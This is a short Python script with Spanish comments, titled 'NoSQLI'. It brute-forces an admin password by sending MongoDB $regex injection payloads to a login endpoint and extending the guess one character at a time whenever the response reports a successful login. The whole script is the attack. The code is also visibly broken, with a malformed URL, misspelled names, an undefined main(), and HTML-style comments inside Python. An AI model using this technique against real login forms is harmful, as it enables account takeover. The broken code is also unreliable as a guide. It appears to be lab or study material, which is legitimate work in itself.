# NoSQLI

from pwn import * <!--# jugar con las barras de progresos-->
import requests <!--#hacer peticiones a servidores-->
import time <!--# tiempos de espera-->
import sys <!--# para poder realizar la salida del progama-->
import signal <!--# para pillar el ctrl_c-->
import string <!--# para declara toos los caracteres que quiero probar-->
 
def saliendo(sig, frame): <!--#capturando el controll c para escapar del programa-->
        print('\n\n[+] Saliendo...\n\n')
        sys.exit(1)

<!--# Capturar control C-->
signal.signal(signal.SIGINT, saliendo) <!--# cuando hagamos ctrl_c mandamos el flujo del progama a la funcion saliendo-->

login_url = "http://localhost:4000user/login"  <!--#url a la que hacer el post-->
caracteres = string.ascii_lowercase + string.asciii_uppercase + string.digits <!-- #caracteres a probar,no metemos simbolos, se puede meter-->

def nosqli():

      password = "" <!--#la creamos vacia para in metiendo los caracteres correctos-->

      p1 = log.progress("Fuerza bruta") <!--# creamos la primera barra de progreso-->
      p1.status( " Iniciando ...")      <!--# la actualizamos-->
      
      time.sleep(2)  <!--# dejamos dos segundos para q lea el usuario-->
      
      p2 = log.progress("Password")   <!--# creamos la segunda barra de progreso--> 
        
      for posicion in range (0,24):  <!--# creamos las iteraciones-->
              for caracter in caracteres:
                      post_data = {"username":"admin","password": {"$regex":"^%s%s"}} % (password,caracter) <!--#lo ponemos en raw , ^%s es que mpieza por algo, por una string -->

                      p1.status(post_data)

                      headers = {'Content-Type': 'application/json'} 
                      
                      respuesta = requsts.post(login_url, headers=headers, data=post_data)
                        
                      if "Logged in as user" in respuesta.text:
                              password += caracter
                              p2.status(password)  
                              break

main()

        nosqli()
